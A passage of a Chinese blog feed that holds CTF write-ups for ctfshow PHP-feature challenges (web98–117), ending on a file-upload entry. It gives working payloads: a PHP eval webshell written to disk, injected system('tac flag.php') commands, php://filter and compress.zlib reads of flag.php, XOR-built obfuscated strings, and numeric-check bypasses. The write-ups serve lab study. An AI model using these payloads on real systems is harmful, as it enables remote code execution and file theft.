single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//HIJKLMN&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$n&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;	&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//OPQRST&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$o&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//UVWXYZ&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$A&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$A&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;o&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$A&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$$A&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;web161  &lt;code&gt;content-type&lt;/code&gt;  为 &lt;code&gt;png&lt;/code&gt; ，文件头为 &lt;code&gt;GIF89a&lt;/code&gt;  绕过&lt;/p&gt;
&lt;p&gt;web166 上传 zip，然后输入一句话&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/98069c85/</guid>
            <title>php 特性</title>
            <link>http://dpm12345.cn/posts/98069c85/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Tue, 04 Oct 2022 22:12:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web-98&#34;&gt;&lt;a href=&#34;#web-98&#34; class=&#34;headerlink&#34; title=&#34;web 98&#34;&gt;&lt;/a&gt;web 98&lt;/h1&gt;&lt;p&gt;根据源码，可知，当传入get参数时。会将get改为post参数（后面的get会变成post，即highlight_file()的判断get参数时，会判断post参数下的值)&lt;/p&gt;
&lt;p&gt;所以说该题的解是，先随便传入一个get值，之后通过post传入&lt;code&gt;HTTP_FLAG=flag&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-99&#34;&gt;&lt;a href=&#34;#web-99&#34; class=&#34;headerlink&#34; title=&#34;web 99&#34;&gt;&lt;/a&gt;web 99&lt;/h1&gt;&lt;p&gt;关键在于&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;if (isset($_GET[&#39;n&#39;]) &amp;amp;&amp;amp; in_array($_GET[&#39;n&#39;], $allow)) {
    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这题主要是运用了&lt;code&gt;in_array()&lt;/code&gt;的弱类型匹配&lt;/p&gt;
&lt;p&gt;故可以写&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;?n=1.php
content=&amp;lt;?php eval($GET[1]);?&amp;gt;
1=systme(&#39;ls&#39;);
1=system(&#39;tac flag.php&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-100&#34;&gt;&lt;a href=&#34;#web-100&#34; class=&#34;headerlink&#34; title=&#34;web 100&#34;&gt;&lt;/a&gt;web 100&lt;/h1&gt;&lt;p&gt;&lt;code&gt;$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这是一个赋值加逻辑语句，而赋值优先级大于逻辑，故&lt;code&gt;v0&lt;/code&gt;首先被赋值，后进行逻辑判断&lt;/p&gt;
&lt;p&gt;故&lt;code&gt;v0&lt;/code&gt;的值只与&lt;code&gt;v1&lt;/code&gt;的值有关，而后面&lt;code&gt;v2&lt;/code&gt;和&lt;code&gt;v3&lt;/code&gt;可以任意选&lt;/p&gt;
&lt;p&gt;这里由于只有&lt;code&gt;eval(&#34;$v2(&#39;ctfshow&#39;)$v3&#34;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;故采用&lt;code&gt;var_dump&lt;/code&gt;函数打印，&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;payload1:
?v1=1&amp;amp;v2=var_dump($ctfshow)&amp;amp;v3=;

payload2: ?v1=1&amp;amp;v2=eval($_POST[1])?&amp;gt;&amp;amp;v3=;
1=highlight_file(&#39;ctfshow.php&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-101&#34;&gt;&lt;a href=&#34;#web-101&#34; class=&#34;headerlink&#34; title=&#34;web 101&#34;&gt;&lt;/a&gt;web 101&lt;/h1&gt;&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/%E5%9B%BE%E7%89%87/web101.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;改为这个&lt;/p&gt;
&lt;p&gt;利用反射机制&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?v1=1&amp;amp;v2=echo new Reflectionclass&amp;amp;v3=;&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-102&#34;&gt;&lt;a href=&#34;#web-102&#34; class=&#34;headerlink&#34; title=&#34;web 102&#34;&gt;&lt;/a&gt;web 102&lt;/h1&gt;&lt;p&gt;只有一种解，查看wp为&lt;/p&gt;
&lt;p&gt;对&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;&amp;lt;?=`cat *`;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;base64编码后，删去末尾”=”,然后进行hex编码，可得到&lt;code&gt;5044383959474e6864434171594473&lt;/code&gt;，恰好有&lt;code&gt;e&lt;/code&gt;，可以用科学计数法绕过&lt;code&gt;v2&lt;/code&gt;的数字判断，而&lt;code&gt;v1&lt;/code&gt;可以传入&lt;code&gt;hex2bin&lt;/code&gt;将十六进制转回base64，&lt;code&gt;v3&lt;/code&gt;使用 &lt;code&gt;filter base64&lt;/code&gt;写入文件，&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v2=115044383959474e6864434171594473&amp;amp;v3=php://filter/convert.base64-decode/resource=web102_2.php
v1=hex2bin
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-103&#34;&gt;&lt;a href=&#34;#web-103&#34; class=&#34;headerlink&#34; title=&#34;web 103&#34;&gt;&lt;/a&gt;web 103&lt;/h1&gt;&lt;p&gt;同web 102做法&lt;/p&gt;
&lt;h1 id=&#34;web-104&#34;&gt;&lt;a href=&#34;#web-104&#34; class=&#34;headerlink&#34; title=&#34;web 104&#34;&gt;&lt;/a&gt;web 104&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;没有判断两值相同的情况，可分别赋一样的值得到flag&lt;/li&gt;
&lt;li&gt;由于shal对数组类型数据不能处理，返回false，因此也可以用数组绕过&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;web-105&#34;&gt;&lt;a href=&#34;#web-105&#34; class=&#34;headerlink&#34; title=&#34;web 105&#34;&gt;&lt;/a&gt;web 105&lt;/h1&gt;&lt;p&gt;这题主要考虑对变量重新赋值的操作&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
include(&#39;flag.php&#39;);
error_reporting(0);
$error = &#39;你还想要flag嘛？&#39;;
$suces = &#39;既然你想要那给你吧！&#39;;
foreach ($_GET as $key =&amp;gt; $value) {        
    if ($key === &#39;error&#39;) {                  
        die(&#34;what are you doing?!&#34;);
    }
    $$key = $$value;                   
}
foreach ($_POST as $key =&amp;gt; $value) {    
    if ($value === &#39;flag&#39;) {            
        die(&#34;what are you doing?!&#34;);
    }
    $$key = $$value;                  
}
if (!($_POST[&#39;flag&#39;] == $flag)) {
    die($error);
}
echo &#34;your are good&#34; . $flag . &#34;\n&#34;;   
die($suces);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对&lt;code&gt;foreach()&lt;/code&gt;中的参数进行研究，对于传入的GET值，键对应key，内容对应value；&lt;/p&gt;
&lt;p&gt;而之后的&lt;code&gt; $$key = $$val&lt;/code&gt;, 则是对某一变量的重新赋值(或者创建一个变量)&lt;/p&gt;
&lt;p&gt;如 如果传入&lt;code&gt;?a=flag&lt;/code&gt;, 那么 &lt;code&gt;$key=a``$value=flag&lt;/code&gt;, 那么在进行 &lt;code&gt;$$key = $$value&lt;/code&gt;语句时，即&lt;code&gt; $a = $flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那么flag值就传入了变量 a 中&lt;/p&gt;
&lt;p&gt;而对于第二个处理POST的&lt;code&gt;foreach()&lt;/code&gt;也是一样的&lt;/p&gt;
&lt;p&gt;重要的是在之后的if判断语句，当POST传入的flag不等于原来的flag值时，将会输出error的值，而对于想要获取flag的我们来说，flag是未知的，也就是说这句判断一定为true，之后的语句一定会进入，即输出error的值&lt;/p&gt;
&lt;p&gt;由此，根据一开始的分析，我们可以设法使error的值变为flag的值&lt;/p&gt;
&lt;p&gt;对于post操作，由于对内容进行了判断，因此不能使用post进行把flag赋值到error的操作，因此只能通过get操作&lt;/p&gt;
&lt;p&gt;而通过对GET段代码判断，发现只过滤了error值，因此可以把flag赋值到某一变量中&lt;/p&gt;
&lt;p&gt;即对get，&lt;code&gt;?变量名=flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;之后的post，需要将flag值赋值到error中，因此对POST&lt;code&gt;error=变量名&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;而之后对POST flag的判断，由于一定为true，故输出error值，即flag&lt;/p&gt;
&lt;h1 id=&#34;web-106&#34;&gt;&lt;a href=&#34;#web-106&#34; class=&#34;headerlink&#34; title=&#34;web 106&#34;&gt;&lt;/a&gt;web 106&lt;/h1&gt;&lt;p&gt;对于104的源代码增添了对传入值的相等判断，那么使用数组绕过 &lt;/p&gt;
&lt;h1 id=&#34;web-107&#34;&gt;&lt;a href=&#34;#web-107&#34; class=&#34;headerlink&#34; title=&#34;web 107&#34;&gt;&lt;/a&gt;web 107&lt;/h1&gt;&lt;p&gt;&lt;code&gt;parse_str(string $string , array &amp;amp;$result ): void&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果string是URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了result则会设置到该数组里）。&lt;/p&gt;
&lt;p&gt;再由代码，只需传入包含flag赋值的&lt;code&gt;v1&lt;/code&gt;，和&lt;code&gt;MD5($v3)&lt;/code&gt; 为传入的flag值&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v3=1
v1=flag=c4ca4238a0b923820dcc509a6f75849b
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-108&#34;&gt;&lt;a href=&#34;#web-108&#34; class=&#34;headerlink&#34; title=&#34;web 108&#34;&gt;&lt;/a&gt;web 108&lt;/h1&gt;&lt;p&gt;截断绕过&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?c=a%00778&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-109&#34;&gt;&lt;a href=&#34;#web-109&#34; class=&#34;headerlink&#34; title=&#34;web 109&#34;&gt;&lt;/a&gt;web 109&lt;/h1&gt;&lt;p&gt;关键在于&lt;code&gt;eval(&#34;echo new $v1($v2());&#34;);&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;解法一&#34;&gt;&lt;a href=&#34;#解法一&#34; class=&#34;headerlink&#34; title=&#34;解法一&#34;&gt;&lt;/a&gt;解法一&lt;/h2&gt;&lt;p&gt;这里需要补充知识&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;如果一个变量的后面跟上 ()，那么会将值作为函数进行调用&lt;/p&gt;
&lt;p&gt;如 &lt;code&gt;$a = &#39;phpinfo&#39;;$a();&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;相当于进行了&lt;code&gt;phpinfo();&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;类于对象魔术方法&lt;/p&gt;
&lt;p&gt;下列方法名被认为是魔术方法： __construct() 、 __destruct() 、 __call() 、 __callStatic() 、 __get() 、 __set() 、 __isset() 、 __unset() 、 __sleep() 、 __wakeup() 、 __serialize() 、 __unserialize() 、 __toString() 、 __invoke() 、 __set_state() 、 __clone() 、 &lt;strong&gt;debugInfo() 。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;__而__toString ()方法用于一个类被当成字符串时应怎样回应。例如&lt;code&gt;echo $obj;&lt;/code&gt;应该显示些什么。&lt;/p&gt;
&lt;p&gt;如以下代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;class test
{
    public $a = &#39;test&#39;;
    public function te()
    {
        return $this-&amp;gt;a;
    }
    public function __toString()
    {
        return $this-&amp;gt;a;
    }
}
echo new test();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将会输出 test&lt;/p&gt;
&lt;p&gt;这样可以采取该方法&lt;code&gt;?v1=mysqli&amp;amp;v2=system(&#39;ls&#39;)&lt;/code&gt;列出目录，之后&lt;code&gt;?v1=mysqli&amp;amp;v2=system(&#39;tac flag.php&#39;)&lt;/code&gt;读取文件&lt;/p&gt;
&lt;p&gt;或者可将&lt;code&gt;mysqli&lt;/code&gt;换成&lt;code&gt;exception&lt;/code&gt;类，&lt;code&gt;exception()&lt;/code&gt;，括号中的参数会将其作为php代码执行(存疑，并不是这样)，不过滤&lt;/p&gt;
&lt;p&gt;因此&lt;code&gt;?v1=exception&amp;amp;v2=system(&#39;tac flag.php&#39;)&lt;/code&gt;也可&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;解法二&#34;&gt;&lt;a href=&#34;#解法二&#34; class=&#34;headerlink&#34; title=&#34;解法二&#34;&gt;&lt;/a&gt;解法二&lt;/h2&gt;&lt;p&gt;将&lt;code&gt;v1&lt;/code&gt;改为&lt;code&gt;reflectionclass&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;实际上，经过尝试，对于大多数类都能这样&lt;/p&gt;
&lt;p&gt;但触发了&lt;code&gt;echo new test(phpinfo());&lt;/code&gt;后，在之后的代码都不会执行 ==(具体原理不清楚)==&lt;/p&gt;
&lt;p&gt;大多数能够输出的原因 (猜测)：&lt;/p&gt;
&lt;p&gt;如果用 echo 输出一个类对象，那么输出结果由&lt;code&gt; __toString()&lt;/code&gt;控制，而在高版本中，&lt;code&gt;__toString&lt;/code&gt;自动存在，其内容为&lt;code&gt;print $value;&lt;/code&gt;, 同时也可自己控制&lt;/p&gt;
&lt;h1 id=&#34;web-110&#34;&gt;&lt;a href=&#34;#web-110&#34; class=&#34;headerlink&#34; title=&#34;web 110&#34;&gt;&lt;/a&gt;web 110&lt;/h1&gt;&lt;p&gt;过滤了各种字符，采用&lt;code&gt;FilesystemIterator&lt;/code&gt;，参数写&lt;code&gt;getcwd&lt;/code&gt;，&lt;code&gt;getcwd&lt;/code&gt;用来取得当前工作目录， 两个连用后返回第一个名字&lt;/p&gt;
&lt;h1 id=&#34;web-111&#34;&gt;&lt;a href=&#34;#web-111&#34; class=&#34;headerlink&#34; title=&#34;web 111&#34;&gt;&lt;/a&gt;web 111&lt;/h1&gt;&lt;p&gt;采用超全局变量GLOBALS，获取全局作用域下的可用的全部变量&lt;/p&gt;
&lt;h1 id=&#34;web-112&#34;&gt;&lt;a href=&#34;#web-112&#34; class=&#34;headerlink&#34; title=&#34;web 112&#34;&gt;&lt;/a&gt;web 112&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=php://filter/resource=flag.php
?file=php://filter/convert.base32-encode/resource=flag.php// 当然 base32 等其他的 base 系列都是可以的，或者其他的编码形式
?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
?file=compress.zlib://flag.php
?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-113&#34;&gt;&lt;a href=&#34;#web-113&#34; class=&#34;headerlink&#34; title=&#34;web 113&#34;&gt;&lt;/a&gt;web 113&lt;/h1&gt;&lt;p&gt;&lt;code&gt;is_file()&lt;/code&gt;也支持一些包装器和伪协议，返回的值为 false&lt;/p&gt;
&lt;h2 id=&#34;解法一-1&#34;&gt;&lt;a href=&#34;#解法一-1&#34; class=&#34;headerlink&#34; title=&#34;解法一&#34;&gt;&lt;/a&gt;解法一&lt;/h2&gt;&lt;p&gt;过滤器被过滤，使用压缩流&lt;code&gt;?file=compress.zlib://flag.php&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;解法二-1&#34;&gt;&lt;a href=&#34;#解法二-1&#34; class=&#34;headerlink&#34; title=&#34;解法二&#34;&gt;&lt;/a&gt;解法二&lt;/h2&gt;&lt;p&gt;linux 里&lt;code&gt;/proc/self/root&lt;/code&gt;是指向根目录的，也就是如果在命令行中输入&lt;code&gt;ls /proc/self/root&lt;/code&gt;，其实显示的内容是根目录下的内容多次重复后绕过&lt;code&gt;is_file&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用脚本跑，得到 payload&lt;/p&gt;
&lt;h1 id=&#34;web-114&#34;&gt;&lt;a href=&#34;#web-114&#34; class=&#34;headerlink&#34; title=&#34;web 114&#34;&gt;&lt;/a&gt;web 114&lt;/h1&gt;&lt;p&gt;filter&lt;/p&gt;
&lt;h1 id=&#34;web-115&#34;&gt;&lt;a href=&#34;#web-115&#34; class=&#34;headerlink&#34; title=&#34;web 115&#34;&gt;&lt;/a&gt;web 115&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
for ($i = 1; $i &amp;lt;= 128; $i = $i + 1) {
    $temp = chr($i) . &#39;1&#39;;
    if (is_numeric($temp) &amp;amp;&amp;amp; trim($temp) !== &#39;1&#39;) {
        echo urlencode($temp), PHP_EOL;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;%0C1
%2B1
-1
.1
01
11
21
31
41
51
61
71
81
91
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对比过滤的符号，发现只有&lt;code&gt;%0c&lt;/code&gt;可以用 &lt;/p&gt;
&lt;p&gt;payload:&lt;code&gt;?num=%0c36&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-117&#34;&gt;&lt;a href=&#34;#web-117&#34; class=&#34;headerlink&#34; title=&#34;web 117&#34;&gt;&lt;/a&gt;web 117&lt;/h1&gt;&lt;p&gt;主要是要通过这些判断语句&lt;/p&gt;
&lt;p&gt;&lt;code&gt;is_numeric($num)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$num !== &#39;36&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;trim($num) !== &#39;36&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;filter($num) == &#39;36&#39;) $num == &#39;36&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;is_numeric()&lt;/code&gt;用于判断&lt;code&gt;num&lt;/code&gt;是否为一个数字，在数字前面加上如&lt;code&gt;%20&lt;/code&gt;的空格，那么仍为&lt;code&gt;true&lt;/code&gt;，如果在后面加，那么为&lt;code&gt;false&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;第二句为不全等于，如果加了空格，因为比较的是字符串的内容，所以一定能通过&lt;/p&gt;
&lt;p&gt;第三句为&lt;code&gt;trim()&lt;/code&gt;函数的应用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符： 
◦ &#34; &#34; (ASCII 32 (0x20))，普通空格符。  
◦ &#34;\t&#34; (ASCII 9 (0x09))，制表符。  
◦ &#34;\n&#34; (ASCII 10 (0x0A))，换行符。  
◦ &#34;\r&#34; (ASCII 13 (0x0D))，回车符。  
◦ &#34;\0&#34; (ASCII 0 (0x00))，空字节符。  
◦ &#34;\x0B&#34; (ASCII 11 (0x0B))，垂直制表符。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;`&lt;/p&gt;
&lt;p&gt;&lt;code&gt;%0c&lt;/code&gt;也还是可以使用，因此可以输入&lt;code&gt;%0c36&lt;/code&gt;绕过&lt;/p&gt;
&lt;p&gt;第四句为函数`filter的通过，观察代码，上述能通过&lt;/p&gt;
&lt;p&gt;第五句为弱等于，由于比较的内容中有数字，因此两边都转换为数字，经过本地测试，&lt;code&gt;%0c36&lt;/code&gt;转换成了数字36，因此也能通过判断&lt;/p&gt;
&lt;p&gt;所以payload:&lt;code&gt;?num=%0c36&lt;/code&gt;&lt;/p&gt;
